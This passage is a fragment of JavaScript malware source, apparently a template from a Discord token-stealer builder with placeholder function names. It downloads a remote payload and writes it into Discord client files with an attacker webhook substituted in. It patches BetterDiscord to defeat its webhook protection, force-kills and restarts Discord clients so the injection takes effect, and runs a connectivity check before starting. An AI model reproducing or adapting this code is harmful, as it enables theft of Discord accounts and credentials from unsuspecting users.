              await %FINDINJ%(filePath);
          }
      }
  }
}

function %INJECTT%() {
  axios.get(%INJURLL%)
  .then(response => {
      let data = response.data;
      injectPath.forEach(file => {
          fs.writeFileSync(file, data.replace("%WEBHOOK%", %webhookstring%), {
              encoding: 'utf8',
              flag: 'w'
          });
      });
  })
  .catch(error => {
      console.log(error);
  });
};

async function %KILLDC%() {
  var clients = [
  'Discord.exe', 
  'DiscordCanary.exe', 
  'discordDevelopment.exe', 
  'DiscordPTB.exe'
  ]
  await exec('tasklist', async (err, stdout, stderr) => {
      for (const client of clients) {
        if (stdout.includes(client)) {
          await exec(`taskkill /F /T /IM ${client}`, (err) => {})
          await exec(`"${LOCAL}\\${client.replace('.exe', '')}\\Update.exe" --processStart ${client}`, (err) => {})
        }
      }
  })
};
function %BETTERBROKE%() {
  let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
  if (fs.existsSync(dir)) {
      let x = fs.readFileSync(dir)
      fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "vareontop"))
  }
  return;
}

async function %DISCORDINJ%() {
  fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
  });
  for (const paths of discords) {
    %FINDINDEX%(paths)
  }
  for (const paths of discords) {
      await %FINDINJ%(paths)
  }
  await %INJECTT%();
  await %BETTERBROKE%();
  if (killdcop)
  await %KILLDC%();
}

async function %VARECHECKSTART%() {
  await %VARESLEEP%(1000)
  axios.get('https://yandex.com').then((res) => {%STARTVARE%()}).catch((err) => {%VARESTARTUP%()});
}


%VARECHECKSTART%()


process.on("uncaughtException", err => console.error(err)).on("unhandledRejection", err => console.error(err));
